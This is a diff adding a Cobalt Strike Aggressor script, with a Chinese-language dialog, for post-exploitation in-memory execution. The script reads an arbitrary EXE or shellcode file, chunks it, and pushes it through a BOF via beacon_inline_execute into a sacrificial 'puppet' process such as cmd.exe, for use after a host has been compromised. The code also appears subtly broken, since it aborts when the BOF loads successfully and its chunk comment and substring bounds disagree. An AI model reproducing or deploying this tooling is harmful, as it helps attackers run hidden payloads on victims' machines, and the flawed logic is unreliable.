@@ -1,0 +1,104 @@
+sub readAllFileData {
+    $fileHandle = openf($1);
+    $fileData = readb($fileHandle, -1);
+    closef($fileHandle);  
+    return $fileData;  
+}
+
+sub loadBOF {
+	$barch  = barch($1);
+	$nativeBOFPath = script_resource("bin/BOFRunPortable. $+ $barch $+ .obj") ;
+    if(-exists $nativeBOFPath){
+        return readAllFileData($nativeBOFPath);        
+    }else{
+        blog($1, "[!] The test_pack native runtime file $nativeBOFPath doesn't exist");
+        return $null;
+    }
+}
+
+
+
+item "内存运行"{
+  local('$bid');
+  foreach $bid ($1){
+    &runAnyWhereDialog($bid);
+  }
+}
+
+
+
+# $state
+# 1 upload
+# 2 upload complete
+# 9999 frp already in memory
+sub runAnyWhere{
+  local('$bid $shellcode_data $state $count $pename')
+  $state = 1;
+  $count = 0;
+  $bid = $3['bid'];
+  $pename = $3['target'].$3['param'];
+ 
+  btask($bid, "******* RunAnyWhere v0.1 *******");
+
+  # read frp shellcode
+  $shellcode_path = $3['file'] ;
+  if(-exists $shellcode_path){
+    $shellcode_data = readAllFileData($shellcode_path)
+  }else{
+    blog($bid,"[!] The shellcode file $shellcode_path doesn't exist");
+    return;
+  }
+
+  # load bof
+  $bofBytes = loadBOF($bid);
+  if($bofBytes != $null){
+      return;
+  }
+
+  $total_size = strlen($shellcode_data);
+  $chunk_size = $total_size;
+  blog($bid,"[!] Total size: $total_size chunk_size:  $chunk_size");
+  # If frp has already been initialized, execute it directly
+
+
+  # 900k chunks sent to leave room for protocol data too
+  $chunkSize = 1024 * 100 ;
+
+  # must split shellcode
+  $numChunks = $total_size / $chunkSize;
+  $remainder = $total_size % $chunkSize;
+  $index = 0;
+
+  for($i = 0; $i < $numChunks; $i++){ 
+        $chunk = substr($shellcode_data, $index, $index + $chunkSize);
+    	$args = bof_pack($bid, "ziiiib", $pename, $state, $total_size, $index , $chunkSize, $chunk) ;
+        $index += $chunkSize;
+        $count = $count + 1;
+        # when("beacon_output_alt", $this);
+        # yield;
+        beacon_inline_execute($bid, $bofBytes, "go", $args);
+    }
+  
+  if($remainder > 0){
+      $state = 2;
+      $chunk = substr($shellcode_data, $numChunks * $chunkSize, ($numChunks * $chunkSize) + $remainder + 1);
+      $args = bof_pack($bid, "ziiiib", $pename, $state, $total_size, $index , $remainder, $chunk) ;
+      btask($1, "upload end block size: $remainder !");
+      beacon_inline_execute($bid, $bofBytes, "go", $args);
+      btask($1, "upload finish!");
+    }
+  
+}
+
+
+sub runAnyWhereDialog{
+	$dialog = dialog("内存运行",%(bid => $1,target => "C:\\WINDOWS\\SYSTEM32\\CMD.EXE"), &runAnyWhere);
+	dialog_description($dialog, "非免杀用！注入后再操作！傀儡进程是64位只能起64位程序，32位数同理");
+	drow_text($dialog, "target",  "傀儡进程路径:");
+	drow_text($dialog, "param",  "运行参数(要加空格):");
+	drow_file($dialog, "file", "要运行的EXE:");
+	dbutton_action($dialog, "GO!");
+	dialog_show($dialog);
+}
+
+
